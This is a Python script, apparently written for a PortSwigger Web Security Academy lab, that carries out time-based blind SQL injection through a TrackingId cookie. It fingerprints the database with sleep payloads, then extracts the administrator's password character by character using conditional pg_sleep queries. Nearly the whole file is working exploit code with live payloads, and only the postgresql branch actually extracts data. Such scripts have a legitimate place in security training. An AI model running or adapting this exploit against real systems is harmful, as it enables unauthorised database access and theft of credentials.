import requests, string

from requests.models import Response
alphabetList = list(string.printable)
restart = True
counter = 0
password = ""
database = ""
#List items for fingerprinting. First ite
databaseFingerprintingDict =  {
"SELECT pg_sleep(3)--":"postgresql",
"dbms_pipe.receive_message((\'a\'),3)--":"oracle",
"WAITFOR DELAY \'0:0:3\'--":"microsoft",
"SELECT sleep(3)#":"mysql"
}

#Fingerprinting database. First we make some queries to cause a short delay to figure out what kind of database it is. Then after that we try the bruteforcing of the password.


for key in databaseFingerprintingDict:
    database = ""
    value = databaseFingerprintingDict[key]
    trackingIDString = '1jOFgiJaOPa8wwFB\' %3b {}'.format(key)
    cookies = {'TrackingId': trackingIDString,'session':'uyVypAtfahrsC86m8N4TwxH6gob87MuA'}
    data = {'csrf' : 'hSzERYtHps6yoLNaNdmWDYg8cWyksz1P','username':'asd','password':'aasd'}
    testPostRequest = requests.post("https://ac671f9a1eb92d918006263600f90033.web-security-academy.net/login",cookies=cookies,data=data)
    registeredTimedelay = testPostRequest.elapsed.total_seconds()
    if(registeredTimedelay > 2):
        database = value
        print(database)
    if(database != ""):
        break

#Exploit database which we have now fingerprinted

while restart:
    counter = counter +1
    for item in alphabetList:

        databaseFingerprintingDict =  {
        "postgresql":" SELECT CASE WHEN (SELECT COUNT(username) FROM users WHERE username = \'administrator\' AND SUBSTRING(password, {}, 1) = \'{}\') = 1 THEN pg_sleep(3) ELSE pg_sleep(0) END--".format(counter,item),
        "oracle":"SELECT CASE WHEN (1=1) THEN \'a\'||dbms_pipe.receive_message((\'a\'),3) ELSE NULL END FROM dual--",
        "microsoft":"IF (1=1) WAITFOR DELAY \'0:0:3\'--",
        "mysql":"SELECT IF(1=1,sleep(3),'a')#"
        }
        sqlInjectionStatement = databaseFingerprintingDict.get(database)
        print(sqlInjectionStatement)
        trackingIDString = '1jOFgiJaOPa8wwFB\' %3b {}'.format(sqlInjectionStatement)
        cookies = {'TrackingId': trackingIDString,'session':'uyVypAtfahrsC86m8N4TwxH6gob87MuA'}
        data = {'csrf' : 'hSzERYtHps6yoLNaNdmWDYg8cWyksz1P','username':'asd','password':'aasd'}
        testPostRequest = requests.post("https://ac671f9a1eb92d918006263600f90033.web-security-academy.net/login",cookies=cookies,data=data)
        resultData = testPostRequest.text
        statuscode = testPostRequest.status_code
        #if "Welcome back!" in resultData:
        #restart = 0
        registeredTimedelay = testPostRequest.elapsed.total_seconds()
        if  registeredTimedelay > 2:
            password+=item
            print(password)
            break
